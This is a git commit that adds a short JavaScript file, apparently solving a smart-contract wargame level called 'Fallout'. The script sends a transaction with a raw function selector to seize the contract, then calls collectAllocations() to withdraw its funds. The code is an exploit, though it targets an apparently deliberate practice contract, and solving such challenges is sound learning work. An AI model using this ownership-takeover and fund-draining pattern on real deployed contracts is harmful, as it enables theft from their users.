c60b0fac9d4dec0372982536b5d080540c3c2324
CosmicSage <prabhakarmishra9@yahoo.com>
2022-06-06 22:24:28 +0530

    yeawhateve

---
+++ 3/fallout.js
@@ -0,0 +1,6 @@
+// To call Fal1back
+let trano = {from : player, value : toWei('0.0009999'), to : instance, data : "0x6fab5ddf"/* signature of Fal1back*/};
+await contract.sendTransaction(trano, function (e, r) {console.log(`err is ${e}`); console.log(`response is ${r}`)});
+
+// dfhlaoisudhfl
+await contract.collectAllocations();
